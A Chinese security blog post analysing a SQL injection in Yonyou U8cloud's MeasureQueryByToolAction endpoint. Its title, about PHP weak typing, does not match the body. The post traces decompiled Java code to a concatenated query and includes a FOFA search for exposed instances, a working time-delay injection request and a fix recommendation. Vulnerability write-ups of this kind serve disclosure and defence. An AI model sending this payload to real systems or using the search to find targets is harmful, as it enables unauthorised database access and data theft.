#  PHP漏洞在白盒审计中的技巧（1）——PHP弱类型特性   
 船山信安   2025-05-25 08:14  
  
## 一、漏洞简介  
  
U8cloud系统MeasureQueryByToolAction  
接口存在SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。  
## 二、影响版本  
  
1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp  
## 三、漏洞原理分析  
  
漏洞位于MeasureQueryByToolAction  
接口处，文件路径为nc.ui.iufo.query.measurequery.MeasureQueryByToolAction  
  
![1747105912_6822b8784dc1139ef78b5.png!small?1747105912673](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicM35zozussiasYicp5BodC4W3ibtrKjcFBRsicrnYojrdLicuBbIcjZld5f77WlibicfGgmAbCfxW0JqaiarQ/640?wx_fmt=jpeg&from=appmsg "")  
  
关键代码如下  
```
public ActionForward execute(ActionForm actionForm) throws WebException {  
    ActionForward actionForward = null;  
    try {  
      String[] cks = getRequestParameterValues("query_id");  
      if (cks == null || cks.length == 0)  
        return (ActionForward)new CloseForward("close_refresh_main();");   
      String strMq = cks[0];  
      String strRepId = "";  
      MeasureQueryConVO[] mqCondVOs = MeasureQueryConBO_Client.loadQueryConVOs(new String[] { strMq });  
      if (mqCondVOs == null || mqCondVOs.length == 0)  
        throw new CommonException("miufo1003095");   
      MeasureQueryConVO mqCondVO = mqCondVOs[0];  
      strRepId = mqCondVO.getM_strRepId();  
      if (strRepId == null)  
        strRepId = "";   
      addRequestObject("report_id", strRepId);  
      addRequestObject("measureQueryId", strMq);  
      actionForward = new ActionForward(RepToolAction.class.getName(), "execute");  
    } catch (CommonException e) {  
      throw e;  
    } catch (Exception e) {  
      AppDebug.debug(e);  
    }   
    return actionForward;  
  }

```  
  
先看下用友系统的请求分发，查看Web.xml，可以看见请求/service  
和/servlet  
前缀的都经过NCInvokerServlet处理  
  
![1747105956_6822b8a473b09a51f8408.png!small?1747105956951](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicM35zozussiasYicp5BodC4W365qic0Svcv4cUzWecrR3WjmRcwECdIADmBHETM8ht7SMU5eRzUicBtsQ/640?wx_fmt=jpeg&from=appmsg "")  
  
方法主要功能是获得url路径后，如果是以/~  
开头，截取第一部分为moduleName  
，然后再截取第二部分为serviceName  
，再根据getServiceObject(moduleName, serviceName)  
实现任意Servlet的调用  
  
比如一个请求url为  
```
/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryByToolAction

```  
  
上面请求url中的iufo  
就是模块名称，com.ufida.web.action.ActionServlet  
就是服务名称  
  
而在com.ufida.web.action.ActionServlet  
方法中  
  
![1747106040_6822b8f8bbb969c9e8072.png!small?1747106041313](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicM35zozussiasYicp5BodC4W33NiavXE1FqUvPx3OXWQ486PibCIZzlz2B5GWL3qpdvdiboFMOFjxGXYGg/640?wx_fmt=jpeg&from=appmsg "")  
  
其中主要处理请求的方法为RequestProcessor.getInstance().process(request, response, this);  
  
继续根据process方法中，可见此处接收参数名称action  
和method  
  
![1747106089_6822b92940cc964224b9c.png!small?1747106089528](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicM35zozussiasYicp5BodC4W3GIWsU4Lb7TnFHgVTv2ho2mjUhZvyiaHh2OveTI45b6gxoAjVygPI6PA/640?wx_fmt=jpeg&from=appmsg "")  
  
最后走到processActionExecute  
方法中执行对应的方法名称  
  
![1747106111_6822b93f57e98ccfdf33f.png!small?1747106111730](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicM35zozussiasYicp5BodC4W3J8YIaEQiaaia8ZHBIa7jA7DNcry3ytYlj1wLs4swypibThffgvAYMmnFA/640?wx_fmt=jpeg&from=appmsg "")  
  
这里直接使用action指定了对应的类名nc.ui.iufo.query.measurequery.MeasureQueryByToolAction  
，method指定了对应的方法名称execute  
，便可以直接调用该Action的对应方法  
  
回到MeasureQueryByToolAction  
中，查看调用的execute  
方法格式  
```
public ActionForward execute(ActionForm actionForm) throws WebException {  
    ActionForward actionForward = null;  
    try {  
      String[] cks = getRequestParameterValues("query_id");  
      if (cks == null || cks.length == 0)  
        return (ActionForward)new CloseForward("close_refresh_main();");   
      String strMq = cks[0];  
      String strRepId = "";  
      MeasureQueryConVO[] mqCondVOs = MeasureQueryConBO_Client.loadQueryConVOs(new String[] { strMq });  
      if (mqCondVOs == null || mqCondVOs.length == 0)  
        throw new CommonException("miufo1003095");   
      MeasureQueryConVO mqCondVO = mqCondVOs[0];  
      strRepId = mqCondVO.getM_strRepId();  
      if (strRepId == null)  
        strRepId = "";   
      addRequestObject("report_id", strRepId);  
      addRequestObject("measureQueryId", strMq);  
      actionForward = new ActionForward(RepToolAction.class.getName(), "execute");  
    } catch (CommonException e) {  
      throw e;  
    } catch (Exception e) {  
      AppDebug.debug(e);  
    }   
    return actionForward;  
  }

```  
  
方法中接收传参query_id  
，赋值给数组cks  
，接着取cks  
数组里的第一个参数，赋值给字符串strMq  
，之后调用loadQueryConVOs  
方法传入strMq  
参数  
```
MeasureQueryConVO[] mqCondVOs = MeasureQueryConBO_Client.loadQueryConVOs(new String[] { strMq });

```  
  
追踪loadQueryConVOs  
方法  
  
![1747106398_6822ba5ed70031b75e339.png!small?1747106399072](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicM35zozussiasYicp5BodC4W3p6YzLDy9UDaolCqg1iaoQxD6fBsm2UUoTicibVHAH2BfZo83H9J4iaT81g/640?wx_fmt=jpeg&from=appmsg "")  
  
进入到方法中，找到造成漏洞的关键代码  
  
代码如下，方法中使用拼接的SQL语句：query_con_id in (strMq)  
导致了最终的SQL注入  
```
public MeasureQueryConVO[] loadQueryConVOs(String[] strQueryConIds) throws SQLException {  
    if (strQueryConIds == null || strQueryConIds.length &lt;= 0)  
      return null;   
    Connection con = getConnection();  
    StringBuffer str = new StringBuffer("query_con_id in( ");  
    for (int i = 0; i &lt; strQueryConIds.length; i++) {  
      str = str.append("'");  
      str = str.append(strQueryConIds[i]);  
      str = str.append("',");  
    }   
    String strWhere = str.toString();  
    strWhere = strWhere.substring(0, str.length() - 1) + ")";  
    String sql = "select query_con_id, con_name, con_note, repid, area, content,query_id from iufo_measure_query_con where " + strWhere;

```  
  
此处可以使用')  
来闭合语句，执行任意的恶意SQL语句，造成敏感信息泄露  
## 四、总结  
  
U8cloud系统MeasureQueryByToolAction  
接口的方法中拼接SQL语句造成了SQL注入漏洞，攻击者可以构造任意的query_id  
参数，执行恶意的SQL语句。  
## 五、资产测绘  
  
FOFA语法  
```
app="用友-U8-Cloud"

```  
  
![1747106471_6822baa7a290b86149a5f.png!small?1747106472095](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicM35zozussiasYicp5BodC4W3CxGGibIN9siaK1FdLVNibnOzdibV1QLLmYAnpW8QZOeiaP8CgmERUWHdicTw/640?wx_fmt=jpeg&from=appmsg "")  
## 六、漏洞复现  
  
POC  
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryByToolAction&method=execute&query_id=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close

```  
  
延时注入5秒  
  
![1747106642_6822bb528d9e0d730eafe.png!small?1747106643286](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicM35zozussiasYicp5BodC4W3TFeF4eACTFwfQnKYxsH8kqaSCYTuEwjOhuicIKTtPxUa99IcMk2YfIQ/640?wx_fmt=jpeg&from=appmsg "")  
## 七、修复建议  
  
安装用友U8cloud最新的补丁，或修改对应方法中拼接SQL语句的问题，使用占位符避免用户输入的参数注入到SQL语句当中。  
  
  
作者：【  
chobits02】  
  
